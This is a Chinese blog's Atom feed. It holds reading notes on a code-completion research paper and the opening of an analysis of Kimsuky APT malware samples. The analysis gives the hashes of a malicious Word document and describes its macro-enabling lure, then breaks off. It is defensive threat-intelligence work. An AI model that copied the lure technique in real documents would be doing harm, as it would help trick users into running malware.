<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>A_Niucw的小屋</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2022-11-09T08:44:31.186Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>A_Niucw</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>AST级和token级代码完成的统一多任务学习模型</title>
    <link href="http://example.com/2022/11/09/AST%E7%BA%A7%E5%92%8Ctoken%E7%BA%A7%E4%BB%A3%E7%A0%81%E5%AE%8C%E6%88%90%E7%9A%84%E7%BB%9F%E4%B8%80%E5%A4%9A%E4%BB%BB%E5%8A%A1%E5%AD%A6%E4%B9%A0%E6%A8%A1%E5%9E%8B/"/>
    <id>http://example.com/2022/11/09/AST%E7%BA%A7%E5%92%8Ctoken%E7%BA%A7%E4%BB%A3%E7%A0%81%E5%AE%8C%E6%88%90%E7%9A%84%E7%BB%9F%E4%B8%80%E5%A4%9A%E4%BB%BB%E5%8A%A1%E5%AD%A6%E4%B9%A0%E6%A8%A1%E5%9E%8B/</id>
    <published>2022-11-09T08:44:41.455Z</published>
    <updated>2022-11-09T08:44:31.186Z</updated>
    
    <content type="html"><![CDATA[<p>本文设计了一款AST级和token级代码完成的统一多任务学习模型</p><span id="more"></span><h1 id="AST级和token级代码完成的统一多任务学习模型"><a href="#AST级和token级代码完成的统一多任务学习模型" class="headerlink" title="AST级和token级代码完成的统一多任务学习模型"></a>AST级和token级代码完成的统一多任务学习模型</h1><h2 id="Abstract："><a href="#Abstract：" class="headerlink" title="Abstract："></a>Abstract：</h2><p>代码完成（代码表示）：应用在继承开发环境中进行预测之后的代码</p><p>依靠统计语言模型的循环神经网络通过大范围项目学习可以增强代码完成的能力</p><p>现在的方法不考虑诸如静态类型信息之类的语法约束而只是根据上下文的语法去预测AST或者Token的值，并只是简单的把这个过程视为一个生成任务</p><p>现有的基于递归神经网络的语言模型不足以对长期依赖进行建模</p><p>本篇文章依赖于AST-level和code-level的代码完成的方式创建了统一多任务的学习解决了上述的限制（无法考虑语法约束）。</p><p>引入了多任务学习框架来预测–&gt;AST- node的值和类型建模</p><p>引入基于自注意结构的网络作为基础语言模型–&gt;捕捉输入程序中的长期依赖性</p><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>statistical language models-&gt;依靠于已存在代码的重复性观察和预测N-gram被广泛使用</p><p>深度学习发展—-&gt;基于递归神经网络的模型</p><p>上述将代码写成抽象语法树（AST）节点序列，通过一部分代码预测最可能出现的下一个代码，存在局限。</p><p>1）分级结构信息未在项目表示中得到充分利用（token-based model简单的化成token序列而无法考虑语法和代码结构，AST- based model 遍历树被展平所以分层级别被忽视，树的结构信息未被充分利用）</p><p>2）循环神经网络（RNN）无法对long-term semantic（语义） dependency进行很好的捕捉</p><p>    当前的代码完成研究创建的长期短期存储器（LSTM）无法对源代码中的长期依赖进行建模</p><p>    长期依赖 (Long-Term Dependency) 是指使用神经网络优化算法时随着结构的逐步加深，模型会不可避免地丧失学习到之前信息的能力，让优化变得极其困难）</p><p>3）源代码元素的类型信息使用不足，类型和值之间的关系被忽略。</p><p>    而AST层面的代码完成研究没有充分考虑他们之间的这些关系。</p><p>    令牌级的代码完成技术和代码建模技术没有考虑类型信息</p><p>本文目的</p><p>    提出统一多任务的代码完成学习框架（讨论AST级和令牌级的代码完成）</p><p>        AST级代码完成将代码视为抽象语法树，并基于从给定部分AST获得的信息进行预测。–&gt;更好的利用程序的语法和结构信息</p><p>        令牌级代码完成将代码视为源令牌序列，并基于从现有token序列获得的信息进行预测。—&gt;token序列&#x3D;&#x3D;键入的自然序列</p><p>        该框架允许我们执行一系列设计决策，这些决策可以帮助我们在完成系统的期望属性之间进行良好的权衡。</p><p>四个组件</p><p>    1）代码元素编码器，将AST节点或源代码令牌编码为分布式矢量表示。</p><p>        包括字编码器和子字编码器</p><p>        其中子字编码器可以更好地捕获由几个子字组成的标识符的语义。</p><p>    2）上下文代码编码器</p><p>        将上下文编码为分布式矢量表示</p><p>        使用RNN- based（基于循环神经网络）Transformer-based 编码器，比较他们的结果</p><p>    3）Path2root编码器，对从预测节点到根节点的路径进行编码。</p><p>    4）代码元素预测器</p><p>        对先前编码器的输出采用多任务学习产生代码完成结果</p><p>比较了代码学习的两项任务（类型和属性）的的两种方式</p><p>    类型优先（先预测类型，辅助预测值）</p><p>    联合预测</p><p>AST-level code completion</p><p>    为了弥合顺序节点序列和AST的层次结构之间的差距，提取了从预测节点到根节点的路径，这表明了预测节点的层次结构。</p><p>    然后使用Path2root编码器将路径信息建模为上下文程序的表示。</p><p>    Code Element Encoder使用两种不同的编码方式对节点进行编码</p><p>    Contextual Code Encoder使用Transformer-XL network编码上下文</p><p>    ASTs有类型和值两种属性</p><p>    联合预测和类型有限两种预测方式</p><p>token-level code completion</p><p>    代码元素编码器采用两种不同的token编码器：word encoder and subword encoder 编码每个token</p><p>    Contextual Code Encoder使用Transformer-XL network编码上下文</p><p>    创建多任务学习模型预测类型和值</p><p>为了评估提出的模型的性能，在AST级和令牌级代码完成的真实数据集上进行了实验。</p><p>    AST：Java、python、JavaScript</p><p>    token：Java、typescript</p><p>研究的扩展方向：</p><p>    Unified Multi-Task learning based neural Language Model for code completion called UMTLM并提出了应用token和AST的普遍框架</p><p>    探讨了对类型和值学习的两种方式。联合、类型优先</p><p>    论了当采用不同的令牌编码器和上下文代码编码器时，性能如何不同。对于令牌编码器，我们考虑字编码器和子字编码器；对于上下文代码编码器，我们考虑基于RNN的编码器和基于Transformer的编码器。</p><p>    添加评估指标：包括标识符预测准确性（用于AST级代码完成）和类型预测准确性（对于令牌级代码完成）</p><p>contributions</p><p>    创建了一种基于神经语言的统一的多任务的代码学习方式，类型和值之间的关系可以提供代码完成过程中的语法语义约束</p><p>    将分层结构信息建模到程序的表示中。</p><p>    采用Transformer XL网络作为语言模型，以捕获上下文标记之间的长距离依赖关系和语义关系。</p><p>    实验验证最佳性能</p><h2 id="Motivating-Example"><a href="#Motivating-Example" class="headerlink" title="Motivating Example"></a>Motivating Example</h2><p>AST节点的层次结构</p><p>    我们使用“Type[Value]”表示每个节点。从预测节点到根节点的路径表明了预测节点的层次结构</p><p>类型和值的关系</p><p>    JAVA IDE的访问，依赖于类型的代码完成是可用的</p><p>    Python、JS IDEs等动态语言，基于type的代码完成是不可用的</p><p>    现如今基于源代码建模技术的静态语言的代码完成研究不考虑两者之间的关系</p><h2 id="Background"><a href="#Background" class="headerlink" title="Background"></a>Background</h2><p>统计语言模型</p><p>    将每个代码块进行标记为st进行评分p(s) &#x3D; p(s1)p(s2 | s1)p(s3 | s1,s2), …,p(st | s1,s2, …,st−1)计算语言</p><p>explicit language models（显示语言模型）   增加了对程序上下文的限制</p><p>    N-gram models</p><p>        令牌的概率仅取决于N− 1个最新令牌 p(st | s1,s2, …,st−1) &#x3D; p(st | st−n+1, …,st−1)</p><p>        模型已被证明能够有效地捕获源代码中的重复规则</p><p>        只能对顺序依赖性进行建模</p><p>    Dependency models</p><p>        依赖模型还可以捕获语法或语义依赖</p><p>Implicit Language Models（隐式语言模型）</p><p>    神经网络对源代码进行建模</p><p>    代码模式由优化的高维实值向量隐式表示。使用训练语料库上的梯度下降算法来估计网络的参数。</p><p>    Recurrent neural networks（循环神经网络）</p><p>        LSTM用于源代码的建模</p><p>    Self-attentional neural networks</p><p>        递归神经网络梯度消失和路径爆炸—-&gt;在长距离单词对之间添加直接连接的注意机制</p><p>        Transformer是一种完全基于注意机制的架构</p><p>        提出multi-headed self-attention mechanism来代替重复层，并且它可以减少顺序计算并捕获更长范围的依赖性。</p><p>        为了解决Transformer网络在语言建模的设置中受到固定长度上下文的限制—&gt;Transformer XL将递归概念引入深度自注意网络—&gt;对代码长期依赖性进行建模</p><p>Multi-task Learning（概念没看懂） MTL</p><p>    多任务学习是一种跨相关任务进行知识转移的方法</p><p>    深度神经网络的多任务学习的方法：隐藏层的硬参数共享或软参数共享</p><h2 id="Proposed-Model（UMTLM模型）"><a href="#Proposed-Model（UMTLM模型）" class="headerlink" title="Proposed Model（UMTLM模型）"></a>Proposed Model（UMTLM模型）</h2><p>总体架构</p><p>    首先将源代码先被加工成AST或token</p><p>    模型都给出了可能的下一个代码元素（源代码标记或AST节点）的列表，以及从训练语料库中估计的概率。</p><p>    Code Element Encoder</p><p>        将代码元素（AST节点或源代码标记）ti编码为分布式向量表示xt的神经网络。</p><p>            AST级连接类型和值向量</p><p>            token级使用word encoder和subword encoder</p><p>    Contextual Code Encoder</p><p>        将程序上下文x1:t编码为分布式向量表示ht的神经网络。</p><p>        为了获取长期依赖，使用Transformer-XL network作为Contextual Code Encoder，实验的时候用RNN进行测试</p><p>    Path2root Encoder</p><p>        一种神经网络，将AST路径p1:mt编码为向量表示Pmt。</p><p>        仅用于AST级代码完成，以弥合顺序节点序列和AST分层结构之间的差距</p><p>    Code Element Predictor</p><p>        获取先前编码器输出并生成代码完成结果的组件。使用MTL（多任务学习）预测下一个令牌</p><p>        使用联合预测和先类型预测后通过类型结果预测进行值预测</p><p>    输入序列被馈送到代码元素编码器以获得输入向量x。然后上下文代码编码器将输入向量x编码为分布式向量表示h。 Path2root编码器编码以产生路径向量表示P,最后，上下文代码向量表示h和路径向量P被连接并馈入代码元素预测器，用于预测下一个节点的类型（BinOp）和值（Empty）</p><p>Code Element Encoder</p><p>    将代码元素（AST节点或源代码标记）ti编码为分布式向量表示xt的神经网络。</p><p>    AST级代码完成使用AST来表示程序，然后将其遍历到节点序列。</p><p>    token级代码完成将代码转化成令牌序列，静态分析或人工注释，可以获得令牌序列中标识符的类型信息。</p><p>        JAVA使用aiXcoder工具提取信息</p><p>        typescript应用Hellendorn等人（2018）中的方法来提取标识符的类型注释。</p><p>    Word Encoder</p><p>        word encoder学习固定词汇表Vt中每个标记或AST节点的值的维度为D的Embedding（文本表示的一类方法）。这需要学习并存储具有｜Vt|×D参数的嵌入矩阵。令牌进行查找的方式：</p><p>            Eword(t) &#x3D; EmbeddingLookUp(t,Vt )”&#x2F;&#x2F;查找embedding矩阵t的D维行</p><p>        词汇表的大小是一个需要调整的超级参数,较小的词汇表减少了内存需求，但代价是无法表示许多标记，从而导致建议不太准确。</p><p>    Subword encoder</p><p>        程序编程的单词通常由子单词组成</p><p>        子字编码器使用Camelcase和下划线命名约定对每个标记或AST节点的值进行标记化，子字被规范化为小写。</p><p>        使用大小为｜Vs|×D的子标记嵌入矩阵来获得每个子标记（eset、emaximum、etime）的Embedding向量，其中Vs是子单词“词汇表”，比完整标记嵌入矩阵小得多</p><p>            Esubword &#x3D;⊕ （ts ∈split (t )） EmbeddingLookUp(ts ,Vs)&#x2F;&#x2F;split（）是一个对其输入进行子标记并返回一组子标记的函数，⊕ 是一个聚合运算符，它“概括”了子单词中单个单词的含义。</p><p>        作用：可以将长字和不频繁出现的拆分为频繁出现的子字</p><p>        优势：可以承担更小的embedding矩阵，帮助理解很少出现的token的含义</p><p>    AST Type encoder</p><p>        将类型属性编码为AST节点的分布式向量。类型编码器直接学习固定词汇表Vtype中每个类型的维度为Dtype的embedding。这需要学习并存储具有|Vtype|×|Dtype|参数的嵌入矩阵</p><p>            Etype(type) &#x3D; EmbeddingLookUp(type,Vtype)&#x2F;&#x2F;返回与类型对应的嵌入矩阵的Dtype维行</p><p>        节点的类型的数量固定，远小于节点的值，因此不存在未知类型，可以提供更小的embdedding矩阵</p><p>    将它们连接为节点xi的最终表示形式xi&#x3D;[Ti；Vi]，Ti表示类型，Vi表示值</p><p>Contextual Code Encoder</p><p>    上下文代码：点之前的token&#x2F;节点作为上下文代码</p><p>    上下文编码器将完成位置相关的上下文信息编码为表示向量ht</p><p>        ht &#x3D; Ecxt (x1,x2, …,xt )</p><p>    RNN-based Context Encoder</p><p>        用于对输入序列的长范围（long-range dependency）依赖进行建模。(在一定范围内)</p><p>        神经网络中的隐藏状态存储了先前时间步中输入的信息，并定期更新：</p><p>            hi &#x3D; RNN(hi−1,xi−1)</p><p>    Transformer-based Context Encoder</p><p>        基于multi-headed自注意机制，可以减少顺序计算并捕获较长范围的依赖性性。</p><p>        Transformer XL被提议在Transformer架构中引入递归机制，这使得Transformer网络能够对非常长期的依赖性（long-term dependency）进行建模。</p><p>        Transformer XL架构重新使用前面的代码而不是从头开始计算获得输入代码的隐藏状态，创建了重复连接，重复使用的隐藏状态可以用作当前段的内存，这使得信息能够通过重复连接传播。该模型可以捕获非常长期的依赖性</p><p>        段sτ的第n层隐藏状态计算公式</p><p>        与标准Transformer相比，关键区别在于密钥knτ+1和值vnτ+1是基于扩展上下文h̃n−1τ+1，因此hn−1τ+1从上一段缓存。</p><p>        由multi-headed自注意机制和位置全连接前馈网络组成。此外，为了在重用状态时保持位置信息的一致性，采用了相对位置emdbedding</p><p>Path2root Encoder</p><p>    提取从预测节点到根节点的路径，即p1t，p2t，…，pmt</p><p>    使用了基于双向LSTM的Path2root编码器，该编码器对路径中的节点进行编码以生成路径向量。两个方向的隐藏向量：</p><p>        Pt &#x3D;[ht(-&gt;)m; ht()&lt;-m]&#x2F;&#x2F;获得每个时间步长的最终路径向量Pt</p><p>Code Element Predictor</p><p>    联合预测类型和值或首先预测类型，然后利用类型预测结果来辅助值预测。</p><p>    联合预测</p><p>        基于相同的隐藏向量联合预测下一个令牌的类型和值。</p><p>        上下文代码编码器htn的输出和路径向量Pt（用于AST级代码完成）连接以计算输出向量Ot。</p><p>        softmax函数来生成输出的概率分布</p><p>            Ot &#x3D; tanh(W o(htn; Pt ))</p><p>            Y type t &#x3D; softmax(W type y Ot + btype)</p><p>            Y value t &#x3D; softmax(W value y Ot + bvalue）</p><p>    类型优先预测</p><p>        首先基于输出向量Ot预测下一个令牌的类型。然后利用预测的类型向量Etype t来辅助值预测</p><p>            类型预测：将上下文代码编码器htn的输出和路径向量Pt（用于AST级代码完成）连接起来，以计算类型预测的输出向量O type t。然后我们使用softmax函数来产生类型预测输出Y类型t的概率分布</p><p>            值预测：使用令牌编码器来计算预测类型Etype t的向量表示，将预测类型Etype t的向量、上下文代码编码器htn的输出和路径向量Pt（用于AST级代码完成）连接起来，以计算值Ovalue t的输出向量。然后将输出向量馈入输出softmax层，以计算Y值t的输出矢量</p><p>                O type t &#x3D; tanh(W type o (htn; Pt ))</p><p>                Y type t &#x3D; softmax(W type y Otype t + btype)</p><p>                Etype t &#x3D; Etoken(Y type t ,Vtype)</p><p>                O value t &#x3D; tanh(W value o (htn; Pt ; Etype))</p><p>                Y value t &#x3D; softmax(W value y Ovalue t + bvalue)</p><p>Training</p><p>    为了在我们的多任务学习框架中学习类型和价值预测任务，我们采用任务特定损失的加权和作为最终损失：</p><p>        loss &#x3D; N ∑ (k&#x3D;1) αk × lossk&#x2F;&#x2F;其中N是任务的数量。αk是第k个任务的损失权重，αk≥ 0, ∑N k&#x3D;1αk&#x3D;1。</p><h2 id="Experiment-and-Analysis"><a href="#Experiment-and-Analysis" class="headerlink" title="Experiment and Analysis"></a>Experiment and Analysis</h2><p>数据集和Vocabulary</p><p>    AST数据的测试</p><p>        Python和Javascript数据集</p><p>            从GitHub存储库中收集的，方法是删除重复文件，删除项目分叉，只保留AST中最多有30000个节点的解析程序。每个数据集包含100000个培训项目和50000个测试项目。提供了源代码文件及其相应的AST。</p><p>            Python中用于解析ast的解析器是PythonStandardLibrary中的ast模块。</p><p>            JavaScript中使用的解析器是Acorn4。</p><p>        Java数据集</p><p>            Java数据集从Github收集。</p><p>            使用javalang转化成ASTs</p><p>        对于所有数据集，每个程序都以其AST格式表示，并且AST以预先排序的深度优先遍历方式序列化，以生成AST节点序列。</p><p>        节点类型值由三部分组成（类型名、是否有子级、是否有正确的兄弟节点）。&lt;—-为了展开的AST节点能够还原回源代码，添加了子节点和兄弟节点，节类型的数量增加</p><p>        然后，生成用于训练和测试的查询，每个AST节点一个，方法是从序列中删除节点和右侧的所有节点，然后尝试预测节点。</p><p>        AST Vocabulary</p><p>            选择了50000个最频繁的值来构建所有三个数据集的价值词汇表。AST Vocabulary表以外的值，使用UNK来表示。对于Python，Java和JavaScript分别为11%、13%和7%</p><p>    Token数据的测试</p><p>        Java and TypeScript。Java数据集与AST数据相同</p><p>        数据集选择GitHub上stars比较多的项目</p><p>        对于JAVA程序，通过静态分析提取标识符的类型信息</p><p>        对于TypeScript程序，我们应用Hellendorn等人（2018）中的方法来提取标识符的类型注释。然后我们过滤程序，以确保每个TypeScript文件中至少有10%的类型注释是用户定义的类型。</p><p>        将项目按8:1:1的比例分成训练&#x2F;验证&#x2F;测试集</p><p>    Token Vocabulary</p><p>        每个训练集中选择K（50000）个最频繁的令牌来构建令牌词汇表,Java和TypeScript测试集的值词汇的UNK率分别为10%、5%和9%。</p><p>Metrics(评估方法)</p><p>    用准确性来评估模型的性能</p><p>    模型为给定上下文的下一个令牌&#x2F;AST节点提供了一个有序的建议列表。我们计算下一个令牌&#x2F;AST节点的值和类型的前1精度，即正确建议出现在预测列表的第一个中的次数。</p><p>    标点符号，如运算符、大括号等都是代码完成的目标</p><p>    在训练和评估过程中，数据语料库中不同数据类型的比例对模型的训练过程有很大影响。超过2&#x2F;3的完成目标（令牌）不是标识符。因此预测这些目标的训练样本多于预测标识符。因此模型将在2&#x2F;3的非标识符令牌上表现得更好</p><p>    然而，在实践中，只有与标识符相关的补全。为了提高标识符的完成性能，我们使用标识符的静态类型信息，并且还将标识符预测准确度（ID准确度）作为度量标识符完成性能的度量。</p><p>    使用标准化精度改进来衡量“改进空间”</p><p>实验设置</p><p>研究问题和结果</p><p>    与最先进的模型相比，我们提出的方法在AST级别的代码完成方面表现如何？</p><p>        与指针混合网络（Pointer Mixture Network）进行比较（基于注意力和指针生成器网络的代码完成模型），与基于深度神经网络的语言模型进行比较（vanilla LSTM和Transformer XL网络）都要更优秀</p><p>        大多数OoV（out-of-vocabulary）令牌仍然无法在PMN中正确预测。模型采用了一个强大的主干语言模型，并引入了MTL（多任务学习）和path2root编码器，它们在in-vocabulary-tokens方面，尤其是在标识符预测方面可以优于其他的模型。</p><p>        应用Wilcoxon秩和检验（WRST）来检验模型在基线上的改进是否具有统计学意义，并且所有的p值都小于1e-5，这表明了显著的改进。</p><p>        使用Cliff’s Delta（Macbeth等人，2011）来测量效果大小，并且这些值是不可忽略的。</p><p>        结论：</p><p>            与普通LSTM或Transformer XL模型相比，UMTLM与相应的上下文编码器（即UMTLM（RNN）和UMTLM）可以实现更好的性能，这表明所提出的组件对于提高AST级代码完成的性能是有效的。</p><p>    提出的方法在令牌级代码完成方面表现如何？</p><p>        结论：</p><p>            模型在Java和TypeScript数据集上都大大优于PMN，尤其是在标识符完成方面。</p><p>            TypeScript数据集的总体改进小于Java，尤其是在标识符完成方面。TypeScript中的标识符比例（9.74%）小于Java（21.04%）</p><p>            比较BPE NLM：当评估完成各种令牌时，BPE NLM的性能不如标识符完成。我们的模型在完成所有类型的token方面大大优于BPE NLM。</p><p>            与普通LSTM或Transformer XL模型相比，具有相应上下文编码器的UMTLM可以实现更好的性能，这进一步证明了所提出的组件对于提高令牌级代码完成的性能是有效的。</p><p>    框架中每个组件在AST级和令牌级代码完成方面的有效性是什么？</p><p>        通过消融研究，以检查最佳模型使用组件的效果，多任务学习机制、子字编码器和Path2root编码器。我们在没有这些组件的情况下进行实验。</p><p>        从Transformer XL架构中移除递归机制进行实验。移除重复机制之后与指针混合网络中LSTM的展开长度（输入序列的长度）相同。</p><p>        结论：</p><p>            完整模型中移除重复机制时，精度会下降很多，甚至低于普通Transformer XL网络。</p><p>            循环机制使模型能够缓存先前上下文信息的内存，从而可以捕获程序中的长程依赖关系。</p><p>            移除子字编码器时，所有数据集的精度也会下降。</p><p>            组件对于提高AST代码完成性能是必须的，MTL对改进的贡献更大。</p><p>            捕获长期依赖对令牌级代码完成非常重要。</p><p>    Computational Cost Per-Suggestion（单个节点的时间消耗）</p><p>        计算了我们提出的模型（基于RNN和基于Transformer）和基线模型预测单个建议所需的平均时间。</p><p>        总的来说，我们的模型在1毫秒内做出预测，这使它们符合实时代码完成系统的要求。1ms左右</p><h2 id="Discussion"><a href="#Discussion" class="headerlink" title="Discussion"></a>Discussion</h2><p>    Learning Process Analysis</p><p>        类型损失表格的原因：</p><p>            通过利用AST的分层结构信息和相关任务的训练信号中包含的信息，我们提出的模型可以从程序中提取更准确和通用的特征，从而可以获得更好的性能</p><p>            采用Transformer XL架构对程序中的长期依赖进行建模，有助于我们的模型从上下文中获取更多信息</p><p>            多任务学习通过任务之间的知识共享提供了一种有效的正则化方法，从而可以通过减少训练和测试损失之间的差异来提高模型的性能，这在一定程度上防止了模型的过度拟合。</p><p>    Training Cost Analysis</p><p>        评估改进的成本，统计了参数的数量，并记录了最佳模型和PMN的训练时间</p><p>        在PMN中，他们采用LSTM作为语言模型，其中大多数递归计算是在隐藏状态的更新过程中执行的。</p><p>        UMTLM中Transformer XL被用作语言模型。在Transformer XL中，每个段的每个输入的表示都是根据自关注层来计算的，并且递归只发生在段之间。因此，它允许更多的并行化，并且需要更少的训练时间。</p><p>        模型中添加Path2root编码器是对模型结构的改进。它增加了模型的复杂性，从而增加了训练时间。</p><p>    权重对任务特定损失的影响</p><p>        我们使用任务特定损失的加权和作为最终损失。模型的性能与任务损失之间的权重选择有关。当对任务的损失给予更多的权重时，该任务的准确性将提高。（对应的准确性）</p><p>    MTL框架中不同学习机制的影响</p><p>        不同学习方式在这两种完成任务中的表现不同。对于AST级别的代码完成，预测两个任务联合执行比类型优先执行更好。对于token级完成，结果是相反的，其中类型优先的方法实现了更好的性能。</p><p>        原因在于AST节点上的类型和值之间的相关性比源代码令牌弱</p><p>    定性分析</p><p>        困难类型预测</p><p>            循环、if语句结构、异常处理语句</p><p>            模型在所有这些类型中都大大优于PMN。此外，在我们的模型中，预测每个令牌的准确度的方差远小于PMN</p><p>            结果表明，我们的模型可以发现程序的结构，并在结构预测方面实现了优异的泛化性能。</p><p>        实例代码完成分析</p><p>            路径的影响</p><p>                在第一个示例中，目标预测名称是函数init的参数，其对应节点的类型是NameParam。从它到根节点的路径暗示了预测是函数参数的信息，因此它可以帮助我们的模型对节点类型进行正确预测。</p><p>                基线模型只能从顺序上下文中学习无法产生正确的预测</p><p>                在第四个例子，路径无法提供准确的信息，因为函数体中存在许多可能的子项。</p><p>            MTL的影响</p><p>                第二个例子，模型可以意识到节点的值是先前上下文中已使用的值。因此，它可以从上下文中识别值。对于基线模型，如果没有辅助任务的帮助，它可能无法实现预测是变量访问操作。</p><p>    对有效性的威胁</p><p>        对外部效度的威胁</p><p>            能否进行推广与我们使用的数据集的质量和结果的可推广性有关。</p><p>        对内部效度的威胁</p><p>            包括每个任务损失之间权重的影响，即αk。</p><p>            对内部有效性的另一个威胁与基线方法实施中的错误有关</p><p>        对概念效度的威胁</p><p>            与我们的评估措施的适用性相关</p><p>            使用准确度，准确度是代码完成的经典评估指标，并已用于许多先前的代码完成工作</p><p>            令牌级和AST级的实验设计并不完全相同，包括输入格式和模型组件。因此，即使在同一数据集中，AST级和令牌级代码完成的结果也不能严格地相互比较。</p><p>                输入格式不同</p><p>                    AST节点和令牌不是一对一的对应关系。</p><p>                    输入的顺序也不同</p><p>                    节点和令牌的类型也不同</p><p>                模型组成不同</p><p>                    对AST级的代码完成设计了path2root编码器来捕获树的分层结构信息，由于令牌序列中没有明确的树结构，因此不能应用于令牌级完成。</p><p>        很难将我们的模型应用到TDD场景中，模型无法预测在任何地方没有存在的一段代码</p><h2 id="Related-Work"><a href="#Related-Work" class="headerlink" title="Related Work"></a>Related Work</h2><p>    本文构建了一个可以在令牌级和AST级执行代码完成的统一框架，这允许我们执行一系列设计决策，这些决策可以帮助我们在完成系统的期望属性之间进行良好的权衡。此外，我们还探讨了不同的模型设置或技术是否对不同的输入格式（令牌和AST）执行相同的操作，从而可以为以后的代码完成研究提供参考</p><p>    在本文中，我们将MTL应用于代码完成，以联合预测下一个代码元素的类型和值，并在统计上显著和实质性地改进最新技术。</p><h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>    提出了一个统一的基于多任务学习的框架，用于AST级和令牌级代码完成</p><p>    设计了一个代码元素编码器，将每个代码元素编码为分布式矢量表示。</p><p>    为了捕获程序中的长期依赖性，我们构建了一个基于Transformer XL网络的上下文代码编码器，将上下文代码编码为分布式矢量表示。</p><p>    为了显式地对程序的分层信息进行建模，我们提出了一种新的Path2root编码器来编码从预测节点到根节点的AST路径。</p><p>    为了利用代码元素的类型和值之间的关系，我们应用MTL框架联合预测下一个代码元素的种类和值，从而实现这两个任务之间的知识共享。</p><p>    实验结果表明，所提出的模型在AST级和令牌级代码完成方面都比以前的最新模型取得了更好的结果。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://blog.csdn.net/a1234556667/article/details/126447044">https://blog.csdn.net/a1234556667/article/details/126447044</a>代码中的长期依赖</p><p><a href="https://111hunter.github.io/2020-08-23-ast/">https://111hunter.github.io/2020-08-23-ast/</a>什么是AST</p><p><a href="https://zhuanlan.zhihu.com/p/27201427">https://zhuanlan.zhihu.com/p/27201427</a>统计语言模型</p><p><a href="https://www.anquanke.com/post/id/221892">https://www.anquanke.com/post/id/221892</a>基于抽象语法树和深度学习的高效漏洞检测方法中前面AST和神经网络相关的内容</p><p><a href="https://zhuanlan.zhihu.com/p/265108616">https://zhuanlan.zhihu.com/p/265108616</a>注意机制与自注意机制</p><p><a href="https://blog.csdn.net/weixin_43580130/article/details/107676664">https://blog.csdn.net/weixin_43580130&#x2F;article&#x2F;details&#x2F;107676664</a>前馈、全连接神经网络</p><p><a href="https://www.zhihu.com/question/38002635">https://www.zhihu.com/question/38002635</a>embedding概念</p><p><a href="https://xcgfth.github.io/2019/05/06/OOV%E9%97%AE%E9%A2%98%E5%92%8CBPE%E7%AE%97%E6%B3%95/#more">https://xcgfth.github.io/2019/05/06/OOV%E9%97%AE%E9%A2%98%E5%92%8CBPE%E7%AE%97%E6%B3%95/#more</a>Oov问题和BPE</p><p><a href="https://teahouse.fifty-five.com/zh-hans/glossary/overfitting/">https://teahouse.fifty-five.com/zh-hans/glossary/overfitting/</a>过度拟合的问题</p><p><a href="https://zhuanlan.zhihu.com/p/32829048">https://zhuanlan.zhihu.com/p/32829048</a>N-gram模型介绍</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;本文设计了一款AST级和token级代码完成的统一多任务学习模型&lt;/p&gt;</summary>
    
    
    
    <category term="代码完成" scheme="http://example.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%8C%E6%88%90/"/>
    
    
  </entry>
  
  <entry>
    <title>Kimsuky样本攻击手段分析</title>
    <link href="http://example.com/2022/10/19/Kimsuky%E6%A0%B7%E6%9C%AC%E6%94%BB%E5%87%BB%E6%89%8B%E6%AE%B5%E5%88%86%E6%9E%90/"/>
    <id>http://example.com/2022/10/19/Kimsuky%E6%A0%B7%E6%9C%AC%E6%94%BB%E5%87%BB%E6%89%8B%E6%AE%B5%E5%88%86%E6%9E%90/</id>
    <published>2022-10-19T04:55:26.096Z</published>
    <updated>2022-10-19T05:08:09.400Z</updated>
    
    <content type="html"><![CDATA[<p>本篇研究文章针对Kimsuky所使用的几个具有代表性的恶意软件样本进行分析，对Kimsuky组织所使用的常用攻击手段进行总结。</p><span id="more"></span><h1 id="Kimsuky样本攻击手段分析"><a href="#Kimsuky样本攻击手段分析" class="headerlink" title="Kimsuky样本攻击手段分析"></a>Kimsuky样本攻击手段分析</h1><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>Kimsuky最早由卡巴斯基于2013年公开披露并命名，攻击活动最早可追溯至2012年，是疑似具有东亚国家背景的APT组织。该组织主要攻击目标为韩国，涉及国防、教育、能源、政府、医疗以及智囊团等领域，以机密信息窃取为主。Kimsuky至今一直处于活跃状态，从2018年开始频繁开展了多起针对韩美两国特定领域人员的攻击活动。</p><p>本篇研究文章针对Kimsuky所使用的几个具有代表性的恶意软件样本进行分析，对Kimsuky组织所使用的常用攻击手段进行总结。</p><h2 id="样本1"><a href="#样本1" class="headerlink" title="样本1"></a>样本1</h2><h3 id="样本基本信息"><a href="#样本基本信息" class="headerlink" title="样本基本信息"></a>样本基本信息</h3><p>样本放入threatbook云沙箱观察它的基本信息，发现这个样本源文件是韩文为标题的.doc文件，所以可以推测是宏病毒。</p><p><img src="https://s2.loli.net/2022/10/19/cdytIiWhOlNeVf6.png" alt="image-20221014194234909.png"></p><p>提取其样本基本信息：</p><table><thead><tr><th align="left">type</th><th>hash</th></tr></thead><tbody><tr><td align="left">SHA256:</td><td>1fcd9892532813a27537f4e1a1c21ec0c110d6b3929602750ed77bbba7caa426</td></tr><tr><td align="left">MD5:</td><td>07d0be79be38ecb8c7b1c80ab0bd8344</td></tr><tr><td align="left">SHA1:</td><td>3acfda840986f215bec88cefa0dfb34b44750508</td></tr></tbody></table><h3 id="样本分析"><a href="#样本分析" class="headerlink" title="样本分析"></a>样本分析</h3><p>在threatbook中下载样本进行分析。下载下来的文件先更改一下文件名为.doc(这里解释一下，当将文件放入二进制编辑工具进行查看的时候发现存在PK标志，这其实是微软在Office 2007中推出的基于XML的文件格式，可以将后缀名改为.zip查看文件的结构。)尝试在office打开文件，打开一张图片提示我们打开宏，并且安全警告中提醒用户程序尝试执行宏指令被制止。所以基本可以推测这是攻击者用来引诱用户打开宏执行宏指令所伪造的主页面。</p><p><img src="https://s2.loli.net/2022/10/19/NRlgfqe37nzcmF8.png" alt="image-20221014195456483.png"></p><p>尝试打开宏，文件执行宏后出现了伪造的文档页面</p><p><img 